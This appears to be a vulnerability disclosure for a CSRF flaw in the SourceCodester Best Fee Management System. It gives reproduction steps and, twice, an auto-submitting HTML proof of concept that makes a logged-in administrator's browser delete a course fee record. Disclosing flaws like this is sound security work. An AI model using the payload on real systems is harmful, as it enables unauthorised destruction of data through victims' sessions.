# Summary
SourceCodester Best Fee Management System Project has a CSRF vulnerability in `/click_fees/index.php?page=courses`, which allows attackers to trick administrators who are logged into the site to delete students' courses fee information.

# Details
In url : `/click_fees/index.php?page=courses`
![image](https://github.com/user-attachments/assets/bf351b9d-6482-44be-bb4f-0bdd98b23736)


Choose module `Courses && Fees` and choose option `delete`:
![image](https://github.com/user-attachments/assets/4aea61f1-5332-44e3-b6b3-23a257a58ac5)



Use burpsuite to intercept, finding that there's no csrf token for protection:
![image](https://github.com/user-attachments/assets/03ac1940-e40e-4184-9f08-85ee01f7d7fb)


CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_course" method="POST">
      <input type="hidden" name="id" value="4" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF3_PoC](https://github.com/N0zoM1z0/Vuln-Search/blob/main/CSRF3_PoC.gif)



# PoC
CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_course" method="POST">
      <input type="hidden" name="id" value="4" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF3_PoC](https://github.com/N0zoM1z0/Vuln-Search/blob/main/CSRF3_PoC.gif)
